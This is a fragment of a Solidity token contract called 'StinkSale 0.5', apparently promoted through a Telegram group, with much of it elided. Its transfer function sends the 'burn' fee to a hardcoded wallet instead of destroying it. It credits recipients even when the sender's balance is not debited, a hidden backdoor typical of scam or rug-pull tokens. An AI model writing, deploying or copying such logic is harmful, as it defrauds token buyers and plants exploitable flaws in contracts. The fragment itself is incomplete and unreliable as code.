...
// Submitted for Telegram: https://t.me/StinkSaleHalf
...
contract  StinkSaleHalf  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "StinkSale 0.5";
    string private _symbol = "STINK0.5";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x05030048864E45f0384Cd318B52B46Aa84f91560] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x05030048864E45f0384Cd318B52B46Aa84f91560, _bruntoken);
        }
